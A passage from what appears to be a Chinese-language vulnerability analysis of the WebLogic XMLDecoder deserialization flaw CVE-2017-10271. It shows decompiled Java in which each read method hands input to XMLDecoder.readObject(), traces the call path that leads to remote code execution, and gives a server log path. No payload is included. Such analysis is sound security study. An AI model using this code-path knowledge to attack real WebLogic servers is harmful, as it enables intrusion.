&nbsp;&nbsp;&nbsp;public void readFully(byte[] var1) throws IOException {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;byte[] var2 = (byte[])((byte[])this.xmlDecoder.readObject());</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.arraycopy(var2, 0, var1, 0, var2.length);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public void readFully(byte[] var1, int var2, int var3) throws IOException {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;byte[] var4 = (byte[])((byte[])this.xmlDecoder.readObject());</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.arraycopy(var4, 0, var1, var2, var3);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public int skipBytes(int var1) throws IOException {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;throw new UnsupportedOperationException();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public boolean readBoolean() throws IOException {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return (Boolean)this.xmlDecoder.readObject();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public byte readByte() throws IOException {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return (Byte)this.xmlDecoder.readObject();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public int readUnsignedByte() throws IOException {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return (Integer)this.xmlDecoder.readObject();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public short readShort() throws IOException {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return (Short)this.xmlDecoder.readObject();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public int readUnsignedShort() throws IOException {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return (Integer)this.xmlDecoder.readObject();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public char readChar() throws IOException {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return (Character)this.xmlDecoder.readObject();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public int readInt() throws IOException {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return (Integer)this.xmlDecoder.readObject();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public long readLong() throws IOException {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return (Long)this.xmlDecoder.readObject();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public float readFloat() throws IOException {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return (Float)this.xmlDecoder.readObject();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public double readDouble() throws IOException {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return (Double)this.xmlDecoder.readObject();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public String readLine() throws IOException {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return (String)this.xmlDecoder.readObject();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public String readUTF() throws IOException {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return (String)this.xmlDecoder.readObject();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public static void main(String[] var0) throws Exception {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;XMLDecoder var1 = new XMLDecoder(new FileInputStream(var0[0]));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WorkContextXmlInputAdapter var2 = new WorkContextXmlInputAdapter(var1);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(var2.readASCII());</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(var2.readInt());</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;byte[] var3 = new byte[20];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var2.readFully(var3);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(var3);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(var2.readBoolean());</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(var2.readByte());</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(var2.readShort());</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(var2.readChar());</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(var2.readInt());</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(var2.readLong());</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(var2.readFloat());</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(var2.readDouble());</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(var2.readUTF());</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(var2.readUTF());</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(var2.readUTF());</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs8926E06">WorkContextXmlInputAdapter-&gt;new XMLDecoder(var1)</span></p><p class="cs40DD2BC9"><span class="cs8926E06">WorkContextEntrylmpl.class</span></p><p class="cs3A447A38"><span class="cs9FB05234">public static WorkContextEntry readEntry(WorkContextInput var0) throws IOException, ClassNotFoundException {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;String var1 = var0.readUTF();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return (WorkContextEntry)(var1.length() == 0 ? NULL_CONTEXT : new WorkContextEntryImpl(var1, var0));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">第</span><span class="cs8926E06">72</span><span class="cs9C1B1871">行，</span><span class="cs8926E06">readUTF()</span></p><p class="cs40DD2BC9"><span class="cs8926E06">WorkContextXmlInputAdapter.class </span><span class="cs9C1B1871">第</span><span class="cs8926E06">103</span><span class="cs9C1B1871">行</span></p><p class="cs3A447A38"><span class="cs9FB05234">public String readUTF() throws IOException {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return (String)this.xmlDecoder.readObject();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Weblogic/%ef%bc%88CVE-2017-10271%ef%bc%89Weblogic%20XMLDecoder%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e_files/image6.png" width="560" height="281" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">当</span><span class="cs8926E06">WorkContextEntrylmpl.class</span><span class="cs9C1B1871">中的</span><span class="cs8926E06">readUTF</span><span class="cs9C1B1871">执行完成之后，返回反序列化的字符串，</span><span class="cs8926E06">rce</span><span class="cs9C1B1871">也执行完成！</span><span class="cs8926E06">8</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Weblogic/%ef%bc%88CVE-2017-10271%ef%bc%89Weblogic%20XMLDecoder%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e_files/image7.png" width="560" height="137" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs8926E06">weglogic log:</span></p><p class="cs3A447A38"><span class="cs9FB05234">/root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/log</span></p></body>
</html>
